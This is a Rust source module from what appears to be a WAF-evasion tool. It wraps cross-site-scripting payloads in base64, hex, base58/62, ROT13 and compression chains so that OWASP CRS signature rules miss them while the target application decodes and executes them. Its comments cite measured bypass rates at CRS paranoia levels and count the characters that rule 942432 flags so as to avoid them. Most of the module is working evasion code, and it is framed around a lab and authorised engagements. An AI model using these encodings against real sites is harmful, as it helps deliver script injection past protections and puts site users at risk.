//! App-transform encodings (the **WAF-opaque delivery** axis for `exploit`).
//!
//! The payload-token axis (which bytes) and reflection-context axis (where they
//! land) are exhausted against a signature WAF: OWASP CRS blocks every
//! executable markup/JS vector at every paranoia level, in every reflection
//! context, because it normalises the encodings it *knows* (URL, HTML-entity,
//! JS, CSS) with its own transforms before matching, and 403s double-URL
//! outright. What it cannot do is reverse an **application-side decoder it has
//! no transform for**.
//!
//! Many real applications run an attacker-controllable value through exactly
//! such a decoder before it reaches a sink: `atob()` in a SPA, a base64/hex
//! token field rendered after decode, a value the backend hex- or base32-
//! decodes. To that WAF the value is an opaque high-entropy blob carrying NO
//! XSS signature; the app decodes it to live markup and it executes. Empirically
//! (`bench/waf-zoo/reflect-origin`, CRS 4.x PL1–PL4): base64 and hex blobs of
//! `<img src=x onerror=alert(1)>` pass with anomaly score ~3 (threshold 5) and
//! execute, while the SAME payload raw, and the encodings CRS *does* model
//! (`\uXXXX`, `&#60;`, double-URL), are 403'd. The exploit surface is the
//! transform the WAF can't model, not its regex engine.
//!
//! This module is the encoder half: given the operator-declared app transform
//! (the discovered decode behaviour), wrap an executable payload in the matching
//! opaque encoding so the WAF sees inert bytes. The decoder half lives in the
//! application (modelled by the lab origin's `ctx=b64|hex|b32|rot13` sinks).
//!
//! **Transforms are pipelines, not opaque functions.** Each catalog entry is a
//! list of reversible [`Stage`]s applied innermost-first, so a chain (`b64x2`),
//! a compression idiom (`zb64` = deflate→base64), and its PL4-clean twin (`zhex`
//! = deflate→hex) are all the *same* machinery with different stage lists, one
//! `deflate` primitive, one base64 primitive, composed by data. The set is
//! Tier-B data: add an [`AppTransform`] row (a new stage list) to model another
//! app decoder; add a [`Stage`] only for a genuinely new primitive.

/// One reversible encoding stage, the atom transforms are built from. A WAF
/// that models every base-N transform individually still can't reverse a *chain*
/// of them, or compression, so composing these is what defeats it.
///
/// Stages are applied **innermost-first**: the pipeline `[Deflate, B64]` yields
/// `base64(deflate(payload))`, exactly what an app that base64-decodes *then*
/// zlib-inflates expects to receive. Every text stage emits ASCII; `Deflate`
/// emits binary and is therefore always chained into a following text stage.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Stage {
    /// zlib (RFC 1950) DEFLATE, the URL-state-compression idiom (pako /
    /// lz-string). Binary output; a signature WAF has no transform to inflate it.
    Deflate,
    /// RAW DEFLATE (RFC 1951), no zlib header/checksum. The `pako.inflateRaw`
    /// idiom that dominates JS SPAs (and `zlib.decompress(data, -15)` server-
    /// side). A distinct decoder class from zlib: a WAF that models neither can
    /// inflate it. Binary output.
    DeflateRaw,
    /// gzip (RFC 1952) framing: `gzip.decompress` / `zlib.gunzip` / a gzipped
    /// body field. Yet another compression a signature WAF cannot reverse.
    /// Binary output.
    Gzip,
    /// Standard base64 (`+`/`/`/`=` alphabet). NB: those three chars are exactly
    /// what CRS PL4 rule 942432 counts (prefer a clean-alphabet stage at PL4).
    B64,
    /// URL-safe base64, no padding (`-_`, JWT/URL convention); the origin
    /// restores padding before decoding.
    B64Url,
    /// Lowercase hex, no separators (a PL4-clean `[0-9a-f]` alphabet).
    Hex,
    /// Lowercase hex with a `0x` prefix the app strips before decoding.
    Hex0x,
    /// RFC4648 base32, uppercase, `=` padded.
    B32,
    /// Base62 (`0-9A-Za-z`), a PURE-ALPHANUMERIC bignum encoding: the *maximally
    /// clean* alphabet, ZERO special characters for any CRS rule to count, and
    /// denser than hex (≈5.95 vs 4 bits/char → shorter blobs, less length-anomaly
    /// surface). Used by URL shorteners / short-ID schemes. No external dep.
    B62,
    /// ROT13 over ASCII letters; preserves shape/length yet carries no XSS
    /// keyword (proof "opaque" need not mean "high-entropy").
    Rot13,
    /// Bitcoin base58 (no `0OIl`, no `+`/`/`) (a clean-alphabet bignum encoding).
    B58,
}

impl Stage {
    /// Apply this stage to raw bytes, yielding the encoded bytes. Text stages
    /// return ASCII; `Deflate` returns binary and is always followed by a text
    /// stage in a real pipeline (so the pipeline's final output is ASCII).
    fn apply(self, input: &[u8]) -> Vec<u8> {
        use base64::Engine;
        match self {
            Stage::Deflate => deflate(input),
            Stage::DeflateRaw => deflate_raw(input),
            Stage::Gzip => gzip(input),
            Stage::B64 => base64::engine::general_purpose::STANDARD
                .encode(input)
                .into_bytes(),
            Stage::B64Url => base64::engine::general_purpose::URL_SAFE_NO_PAD
                .encode(input)
                .into_bytes(),
            Stage::Hex => hex::encode(input).into_bytes(),
            Stage::Hex0x => format!("0x{}", hex::encode(input)).into_bytes(),
            Stage::B32 => b32_encode(input).into_bytes(),
            Stage::B62 => b62_encode(input).into_bytes(),
            Stage::Rot13 => rot13(input),
            Stage::B58 => b58_encode(input).into_bytes(),
        }
    }
}

/// Fold a payload through a pipeline of stages, innermost-first. Every catalog
/// pipeline terminates in a text stage, so the result is valid ASCII; the
/// `expect` documents that invariant (it can only fire for a hand-built
/// binary-terminated chain, which the catalog never contains).
pub(crate) fn encode_stages(stages: &[Stage], payload: &str) -> String {
    let mut buf = payload.as_bytes().to_vec();
    for stage in stages {
        buf = stage.apply(&buf);
    }
    String::from_utf8(buf)
        .expect("app-transform pipeline must terminate in a text stage (ASCII output)")
}

/// One app-side decode behaviour and the encoder pipeline that feeds it. `ctx`
/// is the lab origin's matching sink selector (documentation / sweep wiring);
/// `stages` is the pipeline wafrift puts on the wire (innermost-first).
#[derive(Debug)]
pub(crate) struct AppTransform {
    /// Stable selector used by `--app-transform` and in EXECUTES reports.
    pub name: &'static str,
    /// The reflect-origin `ctx=` sink that decodes this encoding (lab wiring).
    pub ctx: &'static str,
    /// One-line description of the app behaviour this models.
    pub note: &'static str,
    /// Reversible stage pipeline, applied innermost-first, that produces the
    /// WAF-opaque form the app decodes.
    pub stages: &'static [Stage],
}

impl AppTransform {
    /// Encode an executable payload into the WAF-opaque form the app decodes.
    pub fn encode(&self, payload: &str) -> String {
        encode_stages(self.stages, payload)
    }
}

/// The Tier-B catalog of WAF-opaque app transforms. Each models a real, common
/// application decode, expressed as a [`Stage`] pipeline. `rot13` is included as
/// a structural opposite of base/hex (it preserves length and ASCII shape yet
/// still slips CRS, because `<vzt fep=k ...>` matches no known-tag/event-handler
/// signature), a useful proof that "opaque" need not mean "high-entropy". The
/// composite rows (`zb64`, `zhex`, `b64x2`) are multi-stage pipelines, not
/// bespoke functions: a WAF that reverses every single transform still can't
/// reverse a chain.
pub(crate) const APP_TRANSFORMS: &[AppTransform] = &[
    AppTransform {
        name: "b64",
        ctx: "b64",
        note: "app base64-decodes the value (atob / standard base64 token)",
        stages: &[Stage::B64],
    },
    AppTransform {
        name: "b64url",
        ctx: "b64",
        note: "URL-safe base64 (JWT-style -_ alphabet); origin b64 decode is alphabet-tolerant",
        stages: &[Stage::B64Url],
    },
    AppTransform {
        name: "hex",
        ctx: "hex",
        note: "app hex-decodes the value (lowercase, no separators)",
        stages: &[Stage::Hex],
    },
    AppTransform {
        name: "hex0x",
        ctx: "hex",
        note: "hex with a 0x prefix the origin strips before decoding",
        stages: &[Stage::Hex0x],
    },
    AppTransform {
        name: "b32",
        ctx: "b32",
        note: "app base32-decodes the value (RFC4648, padded)",
        stages: &[Stage::B32],
    },
    AppTransform {
        name: "rot13",
        ctx: "rot13",
        note: "app ROT13-decodes the value; preserves shape yet carries no XSS signature",
        stages: &[Stage::Rot13],
    },
    // ── categorically distinct primitives & chains (not base-N variants) ──────
    // These prove the axis is the *decoder class*, not one encoding: a WAF that
    // models every base-N transform still can't reverse compression, a bignum
    // alphabet, or a multi-stage decode chain.
    AppTransform {
        name: "zb64",
        ctx: "zb64",
        note: "app base64-decodes then zlib-inflates (pako/lz-string URL-state compression), a signature WAF cannot inflate DEFLATE",
        stages: &[Stage::Deflate, Stage::B64],
    },
    AppTransform {
        name: "zhex",
        ctx: "zhex",
        note: "app hex-decodes then zlib-inflates, compression with a PL4-CLEAN [0-9a-f] alphabet; bypasses CRS PL4 where zb64's +/= chars are flagged (empirically 100% vs 27%)",
        stages: &[Stage::Deflate, Stage::Hex],
    },
    AppTransform {
        name: "b58",
        ctx: "b58",
        note: "app base58-decodes the value (Bitcoin alphabet; web3/crypto identifiers)",
        stages: &[Stage::B58],
    },
    AppTransform {
        name: "b64x2",
        ctx: "b64x2",
        note: "app base64-decodes twice (a decode chain, breaks a WAF that reverses only one layer)",
        stages: &[Stage::B64, Stage::B64],
    },
    AppTransform {
        name: "b62",
        ctx: "b62",
        note: "app base62-decodes the value (URL-shortener / short-ID alphabet), pure alphanumeric, ZERO special chars (the cleanest blob at CRS PL4)",
        stages: &[Stage::B62],
    },
    AppTransform {
        name: "zrawb64",
        ctx: "zrawb64",
        note: "app base64-decodes then RAW-inflates (pako.inflateRaw, no zlib header; the dominant JS-SPA URL-state idiom a WAF cannot model)",
        stages: &[Stage::DeflateRaw, Stage::B64],
    },
];

/// Resolve an `--app-transform` spec (comma-separated names, or `all`) into the
/// transforms to apply, preserving catalog order and de-duplicating. Returns an
/// error naming the offending token (and the valid set) on any unknown name, so
/// a typo fails closed rather than silently firing fewer transforms.
pub(crate) fn resolve(spec: &str) -> Result<Vec<&'static AppTransform>, String> {
    let spec = spec.trim();
    if spec.eq_ignore_ascii_case("all") {
        return Ok(APP_TRANSFORMS.iter().collect());
    }
    // Validate every requested name first (fail closed on a typo), collecting
    // the request set; then emit in CATALOG order so reports and sweeps are
    // deterministic regardless of how the operator ordered the flag.
    let mut requested: Vec<&str> = Vec::new();
    for tok in spec.split(',').map(str::trim).filter(|t| !t.is_empty()) {
        if by_name(tok).is_none() {
            return Err(format!(
                "unknown app-transform `{tok}`: valid: {} (or `all`)",
                all_names().join(", ")
            ));
        }
        if !requested.contains(&tok) {
            requested.push(tok);
        }
    }
    if requested.is_empty() {
        return Err(format!(
            "no app-transform selected, valid: {} (or `all`)",
            all_names().join(", ")
        ));
    }
    Ok(APP_TRANSFORMS
        .iter()
        .filter(|t| requested.contains(&t.name))
        .collect())
}

/// Look up a transform by exact name.
pub(crate) fn by_name(name: &str) -> Option<&'static AppTransform> {
    APP_TRANSFORMS.iter().find(|t| t.name == name)
}

/// Every transform name, in catalog order (for help text and error messages).
pub(crate) fn all_names() -> Vec<&'static str> {
    APP_TRANSFORMS.iter().map(|t| t.name).collect()
}

impl Stage {
    /// Parse one chain token (the `--transform-chain` surface) into a stage.
    fn from_token(tok: &str) -> Option<Stage> {
        Some(match tok {
            "deflate" => Stage::Deflate,
            "deflate-raw" => Stage::DeflateRaw,
            "gzip" => Stage::Gzip,
            "b64" => Stage::B64,
            "b64url" => Stage::B64Url,
            "hex" => Stage::Hex,
            "hex0x" => Stage::Hex0x,
            "b32" => Stage::B32,
            "b62" => Stage::B62,
            "rot13" => Stage::Rot13,
            "b58" => Stage::B58,
            _ => return None,
        })
    }

    /// The canonical chain token for this stage (inverse of [`Stage::from_token`]).
    fn token(self) -> &'static str {
        match self {
            Stage::Deflate => "deflate",
            Stage::DeflateRaw => "deflate-raw",
            Stage::Gzip => "gzip",
            Stage::B64 => "b64",
            Stage::B64Url => "b64url",
            Stage::Hex => "hex",
            Stage::Hex0x => "hex0x",
            Stage::B32 => "b32",
            Stage::B62 => "b62",
            Stage::Rot13 => "rot13",
            Stage::B58 => "b58",
        }
    }

    /// `true` if this stage emits raw (non-text) bytes. The compression stages
    /// (`deflate`, `deflate-raw`, `gzip`) do; a pipeline must never *end* on one
    /// (the app receives bytes it can't read as a text value and [`encode_stages`]
    /// cannot finalise to a `String`).
    fn produces_binary(self) -> bool {
        matches!(self, Stage::Deflate | Stage::DeflateRaw | Stage::Gzip)
    }
}

/// Every chain-stage token, in declaration order (for help text and errors).
pub(crate) fn stage_token_names() -> Vec<&'static str> {
    [
        Stage::Deflate,
        Stage::DeflateRaw,
        Stage::Gzip,
        Stage::B64,
        Stage::B64Url,
        Stage::Hex,
        Stage::Hex0x,
        Stage::B32,
        Stage::B62,
        Stage::Rot13,
        Stage::B58,
    ]
    .iter()
    .map(|s| s.token())
    .collect()
}

/// Count the characters in `s` that CRS's restricted-character rules flag (the
/// PL4 "special character anomaly" surface, base64's `+`/`/`/`=`, a `0x`-style
/// literal, etc.). A pure-alphanumeric blob scores 0; this is the measured,
/// data-driven form of the "clean alphabet bypasses PL4" finding, the encoder's
/// PL4 risk is now computable, not folklore. ASCII-alphanumeric and the bignum
/// alphabets (no padding/sign chars) are clean; everything else counts.
pub(crate) fn pl4_special_chars(s: &str) -> usize {
    s.chars().filter(|c| !c.is_ascii_alphanumeric()).count()
}

/// Parse a `--transform-chain` spec, a dot-separated pipeline of stage tokens,
/// applied innermost-first (`deflate.hex` ⇒ `hex(deflate(payload))`, the app
/// hex-decodes then zlib-inflates). This is the operator-facing generalisation
/// of the named catalog: any clean-alphabet composition the engagement needs,
/// not just the shipped rows. Fails closed (naming the offending token and the
/// valid set) on an unknown stage, an empty spec, or, the key audit guard, a
/// pipeline that ends in a binary stage (`deflate`), which would otherwise feed
/// the app raw bytes and panic the UTF-8 finalisation in [`encode_stages`].
pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
    let spec = spec.trim();
    let mut stages: Vec<Stage> = Vec::new();
    for tok in spec.split('.').map(str::trim).filter(|t| !t.is_empty()) {
        match Stage::from_token(tok) {
            Some(s) => stages.push(s),
            None => {
                return Err(format!(
                    "unknown transform-chain stage `{tok}`: valid: {} (dot-separated, \
                     innermost first, e.g. `deflate.hex`)",
                    stage_token_names().join(", ")
                ));
            }
        }
    }
    if stages.is_empty() {
        return Err(format!(
            "empty transform-chain, give a dot-separated pipeline, e.g. `deflate.hex` \
             (valid stages: {})",
            stage_token_names().join(", ")
        ));
    }
    if let Some(last) = stages.last()
        && last.produces_binary()
    {
        return Err(format!(
            "transform-chain must end in a text stage: `{}` emits binary bytes the app \
             cannot read as a value; append an encoder, e.g. `{spec}.hex` or `{spec}.b64`",
            last.token()
        ));
    }
    Ok(stages)
}

// ── Stage primitives ─────────────────────────────────────────────────────────
// Each is the inverse of the matching origin decoder, operating on raw bytes so
// stages compose: a binary `Deflate` feeds a text stage, a text stage feeds
// another text stage (the decode chains). base64/hex are inlined in `apply`;
// the multi-line primitives live here.

/// zlib (RFC 1950) DEFLATE of the input, zlib framing so Python's stdlib
/// `zlib.decompress` (the overwhelmingly common server side) reads it directly.
/// Writes to a `Vec`, so every I/O call is infallible.
fn deflate(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::ZlibEncoder};
    use std::io::Write;
    let mut e = ZlibEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("ZlibEncoder write to Vec is infallible");
    e.finish().expect("ZlibEncoder finish on Vec is infallible")
}

/// RAW DEFLATE (RFC 1951), no zlib header or adler32 checksum. Matches
/// `pako.inflateRaw` (JS) and `zlib.decompress(data, -15)` (Python). The bare
/// compressed stream a signature WAF cannot inflate, with no framing to fingerprint.
fn deflate_raw(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::DeflateEncoder};
    use std::io::Write;
    let mut e = DeflateEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("DeflateEncoder write to Vec is infallible");
    e.finish()
        .expect("DeflateEncoder finish on Vec is infallible")
}

/// gzip (RFC 1952) framing, gzip magic + CRC32. Matches `gzip.decompress` /
/// `zlib.gunzip` / `pako.ungzip`. NB: gzip embeds an OS byte; flate2 fixes it to
/// a constant, so the output is deterministic for a given input (round-trip and
/// dedup stay stable).
fn gzip(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::GzEncoder};
    use std::io::Write;
    let mut e = GzEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("GzEncoder write to Vec is infallible");
    e.finish().expect("GzEncoder finish on Vec is infallible")
}

/// Base62 (`0-9A-Za-z`, GMP digit order), big-endian base-256 → base-62 via
/// repeated division, leading zero bytes mapped to leading `0`s. The same
/// bignum scheme as base58 but PURE ALPHANUMERIC: no `+`/`/`/`=`/sign chars, so
/// [`pl4_special_chars`] of its output is 0, the cleanest possible blob for a
/// character-counting WAF rule. No external dependency.
fn b62_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 62] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    let zeros = data.iter().take_while(|&&b| b == 0).count();
    let mut digits: Vec<u8> = Vec::new();
    for &byte in data {
        let mut carry = byte as u32;
        for d in digits.iter_mut() {
            carry += (*d as u32) << 8;
            *d = (carry % 62) as u8;
            carry /= 62;
        }
        while carry > 0 {
            digits.push((carry % 62) as u8);
            carry /= 62;
        }
    }
    let mut out = String::with_capacity(zeros + digits.len());
    for _ in 0..zeros {
        out.push('0');
    }
    for &d in digits.iter().rev() {
        out.push(ALPHABET[d as usize] as char);
    }
    out
}

/// ROT13 over ASCII letters; every other byte passes through unchanged. Its own
/// inverse, so the app's ROT13-decode restores the payload.
fn rot13(input: &[u8]) -> Vec<u8> {
    input
        .iter()
        .map(|&b| match b {
            b'A'..=b'Z' => b'A' + (b - b'A' + 13) % 26,
            b'a'..=b'z' => b'a' + (b - b'a' + 13) % 26,
            other => other,
        })
        .collect()
}

/// RFC4648 base32 (uppercase, `=` padded), no external dep. Encodes each
/// 5-byte group into 8 chars, padding the final partial group.
fn b32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut out = String::new();
    for chunk in data.chunks(5) {
        // Pack up to 5 bytes into a 40-bit big-endian buffer.
        let mut buf: u64 = 0;
        for &b in chunk {
            buf = (buf << 8) | b as u64;
        }
        // Left-align so the top bit of the first byte is bit 39.
        buf <<= 8 * (5 - chunk.len());
        // 5 input bytes → 8 output symbols; emit only the symbols backed by
        // input bits, pad the rest with '='.
        let symbols = (chunk.len() * 8).div_ceil(5);
        for i in 0..8 {
            if i < symbols {
                let idx = ((buf >> (35 - 5 * i)) & 0x1f) as usize;
                out.push(ALPHABET[idx] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

/// Bitcoin base58 (RFC-less, but a single canonical alphabet). Big-endian
/// base-256 → base-58 via repeated division; leading zero bytes map to leading
/// `1`s. No external dependency.
fn b58_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 58] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    let zeros = data.iter().take_while(|&&b| b == 0).count();
    // base58 digits, little-endian; repeated (value*256 + byte) / 58.
    let mut digits: Vec<u8> = Vec::new();
    for &byte in data {
        let mut carry = byte as u32;
        for d in digits.iter_mut() {
            carry += (*d as u32) << 8;
            *d = (carry % 58) as u8;
            carry /= 58;
        }
        while carry > 0 {
            digits.push((carry % 58) as u8);
            carry /= 58;
        }
    }
    let mut out = String::with_capacity(zeros + digits.len());
    for _ in 0..zeros {
        out.push('1');
    }
    for &d in digits.iter().rev() {
        out.push(ALPHABET[d as usize] as char);
    }
    out
}

#[cfg(test)]
#[path = "transform_encode_tests.rs"]
mod tests;
